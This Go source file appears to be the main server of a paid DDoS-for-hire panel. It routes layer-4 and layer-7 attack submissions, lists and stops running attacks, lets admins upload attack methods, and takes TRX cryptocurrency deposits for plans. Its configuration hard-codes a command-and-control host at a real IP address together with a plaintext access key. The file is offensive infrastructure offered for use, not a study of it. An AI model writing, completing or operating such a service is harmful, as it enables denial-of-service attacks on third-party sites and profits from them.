package main

import (
	"fmt"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/dchest/captcha"
)

var (
	activeAttacks              = map[string]AttackData{}
	currentRPS, requestCounter uint64
	startTime                  time.Time

	limiterMu   sync.Mutex
	rateLimiter = make(map[string]*RateLimitEntry)
	clients     = make(map[string]*ClientLimiter)
	clientsMu   sync.Mutex

	// NOTE: Methods are now loaded from the database (table: methods)
	// so the attack panel always reflects what admin configured.
	methods = map[string][]string{}

	mu                sync.Mutex
	walletMu          sync.Mutex
	lastKnownTrxPrice float64 = 0.20
)

var cfg = AppConfig{
	SessionDuration:    24 * time.Hour,
	C2Host:             "http://171.244.61.82:5000",
	C2Key:              "GOD_MODE_SECURE_TOKEN_999",
	BinanceAPI:         "https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT",
	MaxTrxPrice:        5.0,
	MinTrxPrice:        0.01,
	ReferralPercent:    0.15,
	TrustProxy:         false,
	ForceSecureCookies: false,
}

func main() {
	applyEnvConfig()
	initDB()
	if err := initActivityLogger(); err != nil {
		log.Fatalf("activity logger init failed: %v", err)
	}
	startTime = time.Now()
	go resetC2()

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			db.Exec("DELETE FROM sessions WHERE expires < ?", time.Now().Unix())
			atomic.StoreUint64(&currentRPS, atomic.SwapUint64(&requestCounter, 0))
			mu.Lock()
			now := time.Now()
			for id, atk := range activeAttacks {
				if now.After(atk.EndTime) {
					delete(activeAttacks, id)
				}
			}
			mu.Unlock()
			tx, err := db.Begin()
			if err == nil {
				if err := expirePendingDepositsTx(tx, time.Now()); err == nil {
					_ = tx.Commit()
				} else {
					_ = tx.Rollback()
				}
			}
		}
	}()

	http.HandleFunc("/", wrapHandler(handleLanding))

	http.Handle("/captcha/", captcha.Server(240, 80))
	http.HandleFunc("/login", wrapHandler(handleLogin))
	http.HandleFunc("/register", wrapHandler(handleRegister))
	http.HandleFunc("/logout", wrapHandler(handleLogout))
	http.HandleFunc("/admin", wrapHandler(handleAdminPage))

	for _, p := range []string{"dashboard", "panel", "deposit", "market", "support", "documentation", "profile"} {
		http.HandleFunc("/"+p, wrapHandler(handlePage(p+".html")))
	}
	http.HandleFunc("/status", wrapHandler(handleStatusPage))
	http.HandleFunc("/panel/l4", wrapHandler(handlePanelL4Page))
	http.HandleFunc("/panel/l7", wrapHandler(handlePanelL7Page))
	http.HandleFunc("/panel/l4/submit", wrapHandler(handlePanelL4Submit))
	http.HandleFunc("/panel/l7/submit", wrapHandler(handlePanelL7Submit))

	http.HandleFunc("/invoice", wrapHandler(handleInvoicePage))
	http.HandleFunc("/deposit/pay", wrapHandler(handleDepositPayPage))
	http.HandleFunc("/receipt", wrapHandler(handleReceiptPage))
	http.HandleFunc("/receipt/download", wrapHandler(handleReceiptDownload))
	http.HandleFunc("/api/deposit/create", wrapHandler(handleCreateDeposit))
	http.HandleFunc("/api/deposit/check", wrapHandler(handleCheckDeposit))
	http.HandleFunc("/api/admin/add-wallet", wrapHandler(handleAddWallet))
	http.HandleFunc("/api/admin/del-wallet", wrapHandler(handleDelWallet))
	http.HandleFunc("/api/market/purchase", wrapHandler(handlePurchase))
	http.HandleFunc("/api/user/info", wrapHandler(handleUserInfo))
	http.HandleFunc("/api/captcha/new", wrapHandler(handleNewCaptcha))
	http.HandleFunc("/api/attack", wrapHandler(handlePanelAttack))
	http.HandleFunc("/api/attack/list", wrapHandler(apiList))
	http.HandleFunc("/api/attack/stop", wrapHandler(apiStop))
	http.HandleFunc("/api/attack/stopAll", wrapHandler(apiStopAll))
	http.HandleFunc("/api/admin/gen-code", wrapHandler(handleGenCode))
	http.HandleFunc("/api/admin/config-plans", wrapHandler(handleConfigPlans))
	http.HandleFunc("/api/admin/add-product", wrapHandler(handleAddProduct))
	http.HandleFunc("/api/admin/del-product", wrapHandler(handleDelProduct))
	http.HandleFunc("/api/admin/blacklist", wrapHandler(handleBlacklistOp))
	http.HandleFunc("/api/admin/upload-method", wrapHandler(handleUploadMethod))
	http.HandleFunc("/api/admin/deposit/action", wrapHandler(handleDepositAction))
	http.HandleFunc("/api/ticket/create", wrapHandler(handleCreateTicket))
	http.HandleFunc("/api/ticket/reply", wrapHandler(handleReplyTicket))
	// Profile/account APIs
	http.HandleFunc("/api/user/change-password", wrapHandler(handleChangePassword))
	http.HandleFunc("/api/user/token/rotate", wrapHandler(handleRotateToken))
	http.HandleFunc("/api/user/sessions", wrapHandler(handleListSessions))
	http.HandleFunc("/api/user/sessions/revoke", wrapHandler(handleRevokeSession))
	http.HandleFunc("/api/user/sessions/revoke-all", wrapHandler(handleRevokeAllSessions))
	// Public token API
	http.HandleFunc("/api/launch", wrapHandler(apiLaunch))
	http.HandleFunc("/token-login", wrapHandler(handleTokenLogin))
	http.HandleFunc("/redeem-login", wrapHandler(handleRedeemLogin))
	// Activity log admin APIs
	http.HandleFunc("/api/admin/activity/search", wrapHandler(handleActivitySearch))
	http.HandleFunc("/api/admin/activity/export", wrapHandler(handleActivityExport))
	http.HandleFunc("/api/admin/activity/actions", wrapHandler(handleActivityActions))
	http.HandleFunc("/api/admin/activity/download", wrapHandler(handleActivityDownload))

	fmt.Println(">> [TITAN CORE V35 - MODULAR] :8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal("Server failed:", err)
	}
}
